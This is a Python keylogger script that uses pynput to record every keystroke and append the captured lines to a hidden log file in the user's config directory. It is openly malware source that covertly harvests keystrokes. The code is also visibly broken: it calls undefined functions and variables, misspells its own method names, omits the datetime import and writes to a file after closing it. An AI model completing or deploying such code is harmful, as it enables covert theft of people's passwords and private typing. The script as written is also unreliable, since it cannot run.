#! /usr/bin/env python3

from pynput import keyboard
import argparse
import time
import os

# Globals
# Control Vars
lst2 = []
fullstr = []
wLine = ""
F = '0'
# Headers
fC = "[FILE CREATED]: "
fR = "[FILE REMOVED]: "
dC = "[DIRECTORY CREATED]: "
dR = "[DIRECTORY REMOVED]: "
ChD = "[CHANGED DIRECTORY]: "
# Directories
home = str(os.path.expanduser('~'))
haum = (home+"/.config/choom")
sett = (haum+"/Settings")
logs = (haum+"/.Logs")
conf = (home+"/.config")
# Files
lgLoc = "/config/file/dir/.keylog.log"
# Location Tests
haumE = os.path.exists(haum)
settE = os.path.exists(sett)
logsE = os.path.exists(logs)
confE = (conf)
# End Globals

# Class controls what keys are pressed on the keyboard
class KeyControl:
	# param key is the key pressed
	# param F is used to track whether caps is on (1), or caps is off (0)
	# param fullstr is the dynamic string being built as a list
	# param fullstr2 is the final line to be written as a string
	# param log is the log file to be written
	def sort_key(key,F,fullstr,wLine,log):

		try:
			# Checks if the key pressed is a non-character key
			if "Key." in str(key):
				keyString = ("["+str(key).upper()[4:]+"]")

				# Appends Enter to fullstr and writes line to log
				if keyString == ("[ENTER]"):
					fullstr.append(keyString+"\n")
					## Creates a string from the keys pressed list
					wLine = ''.join([str(i) for i in fullstr])
					## Prints current log
					print (wLine+'\n')
					writeline(wLine+'\n')
					fullstr = []
					wLine = ""
					

				# Appends Space to fullstr	
				elif keyString == ("[SPACE]"):
					fullstr.append(' ')

				# Appends Shift to fullstr
				elif keyString == ("[SHIFT]"):
					pass

				# Handles Caps (on/off) and appends to logfile appropriately
				elif keyString == ("[CAPS_LOCK]"):

					# If caps is assumed to be on, append [CAPS_ON] to fullstr
					if F == '0':
						keyString = "[CAPS_ON]"
						fullstr.append(keyString)
						F = '1'

					# If caps is assumed to be off, append [CAPS_OFF] to fullstr
					else:
						keyString = "[CAPS_OFF]"
						fullstr.append(keyString)
						F = '0'

				# If the key isnt logged above or falls within the ASCII spectrum, accept the raw key and append it to fullst
				else:
					fullstr.append(keyString)

			# This captures normal ASCII characters
			else:
				keyString = str(key).strip("'")
				#print(keyString+"\n",end='')
				fullstr.append(keyString)
			
		except:
			pass

# Class controls log files
class LogControl:
	# Checks if parent directories of a specified file path exist
	# param path is the full path that is being tested
	# Creates paths to built directories if not found
	def dirCheck(path):
		# Does not support relative paths.
		testPath = "" # a temporary path built from the full path
		pathSplit = path.split("/") # the given full path split into seperate file names

		# The range here assumes the last file in the path given is not a directory
		for i in range(1,(len(pathSplit)-1)):
			testPath = testPath+"/"+pathSplit[i]
			if os.path.isdir(testPath) != True:
				os.mkdir(testPath)

	# Writes a captured line to the file
	def writeLine(lgLoc,wLine):
		try:
			logFile = open(lgLoc,"a")
			logFile.write(wLine)
		finally:
			logFile.close()

	# initialize log file
	# param logOP is the operation mode of the log
	# param lgLog is the keylogger log path
	def initializeLog(logOP,lgLoc):
		# If logging is being destroyed (-1) then destroy log
		if logOP == -1:
			try:
				logFile = open(lgLoc,"a")
			finally:
				logFile.write(str(datetime.datetime.now().strftime(("-"*16)+"\n[--] Log Destroyed\n[%m/%d/%Y]:[%H:%M:%S]\n")))
				logFile.close()
		# If logging is ON/STARTING (1) then write the starting header
		elif logOP == 1:
			try:
				logFile = open(lgLoc,"a")
			finally:
				logFile.close()
				logFile.write(str(datetime.datetime.now().strftime("\n[+] Log Started\n[%m/%d/%Y]:[%H:%M:%S]\n"+("-"*16))))
		# If logging is OFF/ENDING (0) then write the ending header
		elif logOP == 0:
			try:
				logFile = open(lgLoc,"a")
			finally:
				logFile.write(str(datetime.datetime.now().strftime(("-"*16)+"\n[-] Log Ended\n[%m/%d/%Y]:[%H:%M:%S]\n")))
				logFile.close()
		# If logging is BUILDING/CREATE (2) then build the log
		elif logOP == 2:
			try:
				logFile = open(lgLoc,"a")
			finally:
				logFile.write(str(datetime.datetime.now().strftime(("-"*16)+"\n[++] Log Created\n[%m/%d/%Y]:[%H:%M:%S]\n"+("-"*16))))
				logFile.close()
		# Else, fix the input given to intializeLog
		else:
			print ("Incorrect logIO option given in initializeLog()\nlogIO can only be 1 (start) 0 (stop) -1 (destroy) 2 (build).\n")
			exit(1)

##	
## Main Function
##
def __main__():
	capturetheflags()
	if os.path.exists(LOGFILE) == True:
		intializeLog(1, LOGFILE)
	else:
		intializeLog(2,LOGFILE)
	#starts listening to the keyboard
	try:
		with keyboard.Listener(on_press=sort_key) as l:
			#with each key, run sort
			l.join()
	except:
		print("\nSomething went wrong in __main__()")
		exit(0)

if __name__=="__main__":
	__main__()
